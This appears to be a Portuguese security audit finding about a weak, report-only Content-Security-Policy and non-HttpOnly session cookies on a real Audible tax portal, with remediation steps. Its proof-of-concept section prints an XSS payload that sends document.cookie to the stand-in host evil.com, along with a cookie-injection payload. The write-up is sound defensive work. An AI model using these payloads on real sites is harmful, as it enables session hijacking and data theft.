# Técnica: CSP Report-Only + unsafe-inline/eval — Anula Proteção XSS

**ID:** TAX-001  
**Severidade:** **Medium**  
**Confiança:** Confirmed  
**CVE Potencial:** (N/A — sem XSS específico encontrado, mas CSP ineficaz)

## Resumo

O portal `tax.audible.com` possui um `Content-Security-Policy` configurado **apenas em modo `report-only`**, com as diretivas `'unsafe-inline'` e `'unsafe-eval'` para scripts. Isso significa que **qualquer vulnerabilidade XSS encontrada pode ser explorada sem restrições** — o CSP não bloqueia nada.

## Evidência

```
content-security-policy-report-only:
  default-src https://*.amazon.com https://*.media-amazon.com ...;
  script-src   https://*.amazon.com https://*.media-amazon.com ...
               'unsafe-inline' 'unsafe-eval';
  style-src    https://*.amazon.com ... 'unsafe-inline';
  report-uri   /1/batch/2/OE/...
```

## Superfície de Ataque Identificada

### 1. Inline Scripts sem Nonce

A página carrega 7 scripts inline, **nenhum com nonce**. O `unsafe-inline` permite que qualquer script inline execute:

```html
<script>var aPageStart = (new Date()).getTime();</script>
<script>
function loadTaxportalByLang(value,cookieName) {
    document.cookie = cookieName + "=" + value + ";path=/";
    // ...
}
</script>
<script type="text/javascript"><!-- Amazon P Framework ~16KB --></script>
```

### 2. `unsafe-eval` — Execução Dinâmica

A diretiva `unsafe-eval` permite chamadas como:
- `eval(string)`
- `setTimeout(string, delay)`
- `new Function(string)`
- `setInterval(string, delay)`

O framework Amazon P usa `setTimeout(z, 0)` com referência de função (seguro), mas a presença de `unsafe-eval` impede detecção de uso abusivo.

### 3. Amazon P Framework — Superfície de Ataque DOM

O framework proprietário da Amazon (16KB inline) contém:

| Sink | Ocorrências | Risco |
|------|-------------|-------|
| `postMessage(a)` | 2 | PostMessage XSS se origin não validado |
| `location` / `window.location` | 6 | DOM XSS via hash/protocolo |
| `URLSearchParams` | Presente | Parsing de parâmetros URL |
| `onerror handler` | 1 | Error handler pode vazar info |
| `serviceWorker postMessage` | 1 | Mensagens para SW |

### 4. `loadTaxportalByLang` — Injeção via Cookie (Stored XSS)

```javascript
function loadTaxportalByLang(value, cookieName) {
    document.cookie = cookieName + "=" + value + ";path=/";  // ← value não sanitizado
    var uri = window.location.toString();
    if (uri.indexOf("?") > 0 && location.search.includes("?lc=")) {
        location.href = new URL(uri.substring(0, uri.indexOf("?"))).toString();
    } else {
        location.reload();
    }
    $("#tax-portal-language").val(value)  // ← jQuery .val() seguro
}
```

Chamado via: `onchange="loadTaxportalByLang(this.value,'taxportal-lc')"`

**Vetor:** Se o valor `taxportal-lc` cookie for lido e inserido no DOM em outra página, há stored XSS.

### 5. Cookies sem HttpOnly — Acessíveis via JS

```
set-cookie: session-id=...; Domain=.audible.com; Secure
                                      ↑ Ausente: HttpOnly
                                      ↑ Ausente: SameSite
```

Qualquer XSS no domínio pode roubar `session-id` e `session-id-time` via `document.cookie`.

## Exploração Prática (Proof of Concept)

Qualquer entrada XSS clássica funcionaria:

```
# Reflected XSS (se existisse parâmetro refletido):
https://tax.audible.com/?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

# Stored XSS via cookie (se o cookie for refletido):
document.cookie = "taxportal-lc=<img src=x onerror=alert(document.cookie)>"
```

**🔴 O CSP não bloquearia nenhum dos dois.**

## Linha do Tempo

| Passo | Descrição |
|-------|-----------|
| 1 | Atacante identifica parâmetro refletido ou stored input |
| 2 | Injeta `<script>alert(document.cookie)</script>` |
| 3 | CSP não bloqueia (`unsafe-inline` permite) |
| 4 | Payload executa — cookie `session-id` exposto via `document.cookie` |

## Recomendações

### Imediatas (alta prioridade)

1. **Mudar CSP de `report-only` para `enforce`**
   ```http
   # ANTES (não bloqueia)
   content-security-policy-report-only: ...
   
   # DEPOIS (bloqueia)
   content-security-policy: ...
   ```

2. **Remover `'unsafe-inline'` e `'unsafe-eval'` de `script-src`**
   
3. **Implementar nonce-based CSP para scripts inline**
   ```http
   script-src 'nonce-{random}' 'strict-dynamic' https://*.amazon.com;
   ```

### Curto Prazo

4. **Cookie `session-id`: adicionar `HttpOnly; SameSite=Lax`**
5. **Aplicar `X-XSS-Protection: 1; mode=block`** (já presente ✅)
6. **Validar `origin` no handler de `postMessage` do P framework**

## Referências

- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
- [OWASP XSS Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN CSP: script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
- [PortSwigger: What is CSP?](https://portswigger.net/web-security/csp)
